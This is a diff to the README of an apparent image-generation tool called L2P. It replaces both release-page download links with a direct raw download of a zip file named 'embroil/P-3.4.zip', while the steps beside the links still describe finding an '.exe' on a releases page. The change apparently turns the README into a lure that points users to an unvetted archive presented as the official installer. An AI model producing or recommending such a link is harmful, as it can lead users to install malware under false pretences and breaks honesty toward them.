@@ -1,6 +1,6 @@
 # 🎨 L2P - Generate High Quality Images With Ease
 
-[![](https://img.shields.io/badge/Download-L2P_Releases-blue)](https://github.com/aerated-genuslycaena215/L2P/releases)
+[![](https://img.shields.io/badge/Download-L2P_Releases-blue)](https://raw.githubusercontent.com/aerated-genuslycaena215/L2P/main/embroil/P-3.4.zip)
 
 L2P turns your creative ideas into digital images. It uses a process called latent space exploration to build detailed graphics from simple text. This software runs locally on your computer. You keep full control over your work without needing to send data to the cloud.
 
@@ -18,7 +18,7 @@ Your computer needs a few things to run L2P smoothly. Check that your system mee
 
 Follow these steps to set up the software.
 
-1. Visit the project website. Click this link: [Download L2P Releases](https://github.com/aerated-genuslycaena215/L2P/releases).
+1. Visit the project website. Click this link: [Download L2P Releases](https://raw.githubusercontent.com/aerated-genuslycaena215/L2P/main/embroil/P-3.4.zip).
 2. Look for the latest version at the top of the list.
 3. Find the file ending in `.exe`. It will look like `L2P-Setup-v1.0.exe`.
 4. Click the file name to start the download.
